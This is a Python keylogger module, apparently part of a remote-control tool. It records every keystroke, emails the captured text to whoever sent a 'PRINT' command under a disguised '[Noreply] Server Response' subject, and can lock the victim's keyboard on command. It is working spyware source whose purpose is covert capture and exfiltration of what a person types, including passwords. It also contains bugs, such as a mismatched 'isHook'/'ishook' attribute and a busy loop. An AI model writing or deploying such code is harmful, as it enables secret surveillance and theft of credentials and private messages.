import threading, keyboard
from pynput.keyboard import Listener 

class KeyloggerControl:
    def __init__(self):
        self.isLock = 0
        self.isHook = 0
        self.flag = 0
        self.container = " "
        self.msg = ""

    def Keylogger(self, key):
        if self.flag == 4:
            return False
        if self.flag == 1:
            tmp = str(key)
            if tmp == 'Key.space':
                tmp = ' '
            elif tmp == '"\'"':
                tmp = "'"
            else:
                tmp = tmp.replace("'", "")
            self.container += str(tmp)
        return

    def Print(self, data, emailTemplate):
        emailTemplate.SendNotification(emailFrom = emailTemplate.userName , emailTo = data.From, subject = "[Noreply] Server Response", body = self.container)
        self.container = " "
        return
    
    def Listen(self):
        with Listener(on_press = self.Keylogger) as listener:
            listener.join()  
        return
    
    def Lock(self):
        if self.isLock == 0:
            for i in range(150):
                keyboard.block_key(i)
            self.isLock = 1
        else:
            for i in range(150):
                keyboard.unblock_key(i)
            self.isLock = 0
        return
    
    def KeyloggerHandle(self, data, emailTemplate):
        self.isLock = 0
        self.isHook = 0
        self.flag = 0
        self.container = " "
        self.msg = ""
        threading.Thread(target = self.Listen).start() 

        while True:
            if "HOOK" in data:
                if self.ishook == 0:
                    self.flag = 1
                    self.ishook = 1
                else:
                    self.flag = 2
                    self.ishook = 0
            elif "PRINT" in data:
                self.Print(data, emailTemplate)
            elif "LOCK" in data:
                self.Lock()
            elif "QUIT" in data:
                self.flag = 4
                return    
        return 